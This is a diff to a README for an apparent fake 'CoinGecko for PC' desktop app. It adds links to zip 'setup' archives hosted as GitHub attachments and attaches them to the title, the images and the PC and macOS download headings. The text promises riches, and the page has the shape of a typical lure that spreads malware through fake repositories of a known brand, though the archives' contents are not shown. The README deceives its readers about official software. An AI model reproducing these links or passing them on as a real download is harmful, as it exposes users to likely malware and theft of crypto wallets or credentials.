@@ -1,10 +1,10 @@
-# CoinGecko-for-PC
-[![Coingecko](https://github.com/user-attachments/assets/e0024fe5-c874-488b-9ef6-e93517315363)]()
+# [CoinGecko-for-PC](https://github.com/user-attachments/files/18356697/CoinGecko-PC-Setup.zip)
+[![Coingecko](https://github.com/user-attachments/assets/e0024fe5-c874-488b-9ef6-e93517315363)](https://github.com/user-attachments/files/18356697/CoinGecko-PC-Setup.zip)
 
 ## CoinGecko — Your Personal Crypto Analyzer for PC
 CoinGecko is a powerful desktop client that provides essential tools for cryptocurrency analysis. With this app, you can track prices, market cap, trading volumes, and other key metrics in real-time, along with in-depth analysis and statistics for thousands of cryptocurrencies. Its user-friendly interface and rich functionality make CoinGecko the ideal solution for traders, investors, and crypto enthusiasts.
 
-[![e9mBgKVQwWV57E93bemw_21_02_What_is_Coingecko](https://github.com/user-attachments/assets/6db650f2-d8ca-4ead-bb50-b00cd307a04a)]()
+[![e9mBgKVQwWV57E93bemw_21_02_What_is_Coingecko](https://github.com/user-attachments/assets/6db650f2-d8ca-4ead-bb50-b00cd307a04a)](https://github.com/user-attachments/files/18356697/CoinGecko-PC-Setup.zip)
 
 ## What is CoinGecko for PC?
 CoinGecko for PC is a desktop application that lets users track the cryptocurrency market from their computer. It combines convenience and powerful features, providing all the necessary data to make informed decisions. The app supports over 6,000 cryptocurrencies, including both well-known and emerging projects.
@@ -45,8 +45,8 @@ CoinGecko for PC has an intuitive interface that makes it easy to navigate and a
 3. Open CoinGecko and set up your portfolios and preferred cryptocurrencies.
 4. Become Rich!!!
 
-## [Download CoinGecko for PC]()
-## [Download CoinGecko MacOS]()
+## [Download CoinGecko for PC](https://github.com/user-attachments/files/18356697/CoinGecko-PC-Setup.zip)
+## [Download CoinGecko MacOS](https://github.com/user-attachments/files/18356717/CoinGecko-MacOS-Setup.zip)
 
 ## Conclusion
 CoinGecko for PC is the ultimate tool for anyone interested in cryptocurrency. With real-time data, powerful analysis tools, and a simple interface, it’s perfect for tracking the market and making informed decisions. Whether you’re a trader, investor, or crypto enthusiast, CoinGecko will keep you connected to the fast-moving world of cryptocurrencies.
